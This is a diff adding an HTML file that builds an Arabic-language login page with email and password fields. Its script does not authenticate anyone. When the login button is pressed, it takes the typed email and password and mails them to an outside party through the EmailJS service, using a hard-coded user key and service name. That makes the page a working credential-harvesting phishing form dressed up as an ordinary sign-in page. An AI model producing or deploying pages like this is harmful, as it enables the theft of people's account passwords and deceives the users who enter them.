@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نموذج تسجيل دخول</title>
+    <!-- تضمين مكتبة EmailJS -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+
+    <style>
+        /* تنسيق الصفحة */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        /* تنسيق المستطيل (المدخلات) */
+        .rectangle {
+            background-color: #fff;
+            border: 2px solid #ccc;
+            padding: 15px;
+            margin-bottom: 20px;
+            width: 300px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        /* تنسيق زر الدخول */
+        .login-button {
+            background-color: green;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 18px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        .login-button:hover {
+            background-color: darkgreen;
+        }
+
+        /* عنوان "سجل دخول" */
+        .title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <!-- عنوان "سجل دخول" -->
+    <div class="title">سجل دخول</div>
+
+    <!-- مستطيل البريد الإلكتروني -->
+    <div class="rectangle">
+        <label for="amil">البريد الإلكتروني:</label>
+        <input type="text" id="amil" name="amil">
+    </div>
+
+    <!-- مستطيل كلمة المرور -->
+    <div class="rectangle">
+        <label for="password">كلمة المرور:</label>
+        <input type="password" id="password" name="password">
+    </div>
+
+    <!-- زر الدخول -->
+    <button class="login-button" onclick="submitForm()">دخول</button>
+
+    <script>
+        // تهيئة EmailJS باستخدام User ID الخاص بك
+        emailjs.init("RufM_4pBQfD6xWtE6");  // استبدل بـ User ID الخاص بك
+
+        // دالة لإرسال البيانات عند الضغط على زر "دخول"
+        function submitForm() {
+            const amil = document.getElementById('amil').value;
+            const password = document.getElementById('password').value;
+
+            // بيانات النموذج التي سيتم إرسالها عبر البريد الإلكتروني
+            const templateParams = {
+                amil: amil,
+                password: password,
+            };
+
+            // إرسال البريد الإلكتروني عبر خدمة EmailJS
+            emailjs.send('Samy1082008', 'your_template_id', templateParams)
+                .then(function(response) {
+                    console.log('تم إرسال البيانات بنجاح', response);
+                }, function(error) {
+                    console.log('فشل في إرسال البيانات', error);
+                });
+        }
+    </script>
+</body>
+      </html>
